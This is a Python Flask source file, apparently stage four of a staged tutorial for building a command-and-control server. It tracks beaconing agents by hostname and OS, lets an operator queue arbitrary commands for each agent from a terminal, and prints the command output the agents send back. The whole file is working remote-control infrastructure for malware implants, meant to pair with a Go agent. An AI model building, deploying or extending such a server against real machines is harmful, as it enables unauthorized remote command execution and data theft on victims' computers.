"""
SERVER — Stage 04 (Task Queue + Command Result)

Matches: agent/stages/stage04_sending command result with alive status.go

What this adds:
- In-memory task queue per agent
- /beacon route returns a task if one is queued
- Agent POSTs output back in next beacon
- Operator types command in terminal to queue it
"""

from flask import Flask, request, jsonify
from datetime import datetime
import threading

app = Flask(__name__)

agents   = {}   # agent_id -> info
tasks    = {}   # agent_id -> pending task string
results  = {}   # agent_id -> last output

@app.route("/beacon", methods=["POST"])
def beacon():
    data     = request.get_json()
    agent_id = data.get("agent", "unknown")

    # Store agent info
    agents[agent_id] = {
        "hostname":  data.get("hostname", "?"),
        "os":        data.get("os", "?"),
        "status":    data.get("status", "unknown"),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    # Store output if agent sent one
    if data.get("output"):
        results[agent_id] = data["output"]
        print(f"\n[OUTPUT from {agent_id}]\n{data['output']}\n{'='*40}")

    # Return queued task (if any)
    task = tasks.pop(agent_id, None)
    return jsonify({"task": task or ""})

def command_input_loop():
    """Operator terminal — type: <agent_id> <command>"""
    while True:
        try:
            line = input("cmd> ").strip()
            if not line:
                continue
            parts = line.split(" ", 1)
            if len(parts) < 2:
                print("Usage: <agent_id> <command>")
                continue
            agent_id, cmd = parts
            tasks[agent_id] = cmd
            print(f"[*] Task queued for {agent_id}: {cmd}")
        except (EOFError, KeyboardInterrupt):
            break

if __name__ == "__main__":
    print("[*] Stage 04 server started on http://127.0.0.1:8080")
    print("[*] Command input: <agent_id> <command>")
    threading.Thread(target=command_input_loop, daemon=True).start()
    app.run(host="0.0.0.0", port=8080, debug=False)
